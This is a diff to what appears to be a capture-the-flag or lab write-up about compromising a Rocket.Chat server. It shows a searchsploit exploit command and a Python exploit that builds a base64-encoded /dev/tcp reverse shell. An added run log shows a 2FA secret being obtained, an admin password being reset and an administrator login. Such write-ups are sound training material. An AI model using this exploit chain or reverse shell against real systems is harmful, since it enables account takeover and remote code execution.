@@ -63,8 +63,6 @@ While browsing, I intercepted requests with **Burp Suite** and noticed API calls
 
 ![exception](/assets/img/exception6.png){: .mx-auto .shadow .rounded-10 w="800" }
 
-http://10.1.228.158:3000/api/info
-
 I saw that there was an API running in the background, so I checked the version.
 
 ![exception](/assets/img/exception7.png){: .mx-auto .shadow .rounded-10 w="800" }
@@ -79,8 +77,6 @@ After checking the version of Rocket.Chat, I found that it is vulnerable to NoSQ
 
 After confirming the vulnerability and getting the Exploit-DB ID, I downloaded it using searchsploit.
 
-![exception](/assets/img/exception9.png){: .mx-auto .shadow .rounded-10 w="800" }
-
 I then used the exploit with the following command:
 
 ```bash
@@ -90,10 +86,9 @@ I then used the exploit with the following command:
   -a localh0ste@exception.local \
   -t http://10.1.228.158:3000
 ```
-
 While doing this and waiting for the password reset, I set up a listener.
 
-![exception](/assets/img/exception11.png){: .mx-auto .shadow .rounded-10 w="800" }
+![exception](/assets/img/exception9.png){: .mx-auto .shadow .rounded-10 w="800" }
 
 The script took too long, which caused the token to expire.
 
@@ -297,6 +292,29 @@ rev = '/bin/sh -i >& /dev/tcp/'+revip+'/'+revport+' 0>&1'
 encoded_rev = base64.b64encode(rev.encode()).decode()
 payload = 'echo ' + encoded_rev + ' | base64 -d | bash'
 rce(target, code, payload, privuser)
+```
+
+Here how I run the script:
+```bash
+┌──(kali㉿kali)-[~]
+└─$ python3 exploit.py \
+  -t http://10.1.228.158:3000 \
+  -u drewbyte@drewbyte.com \
+  -U drewbyte-1 \
+  -p password \
+  -a localh0ste@exception.local \
+  -A localh0ste \
+  -H 10.200.48.178 \
+  -P 4446
+[+] Successfully authenticated as drewbyte-1
+Got the code for 2fa: KIYTUQZKO4YD6ZJYEUWFAMB4OBAU6I3RJBCXMP3UGJHEOOBJGNLQ
+[+] Resetting localh0ste@exception.local password
+[+] Password Reset Email Sent
+[+] Successfully authenticated as drewbyte-1
+Got the reset token: 56GFN6WvQckZbg2LHIlHQrE3wknNAV_XGa7pQ1g6EMA
+[+] Admin password changed !
+[+] Successfully authenticated as administrator
+{"success":false}
 ```
 
 After that, I converted the 2FA secret into a numeric code using oathtool:
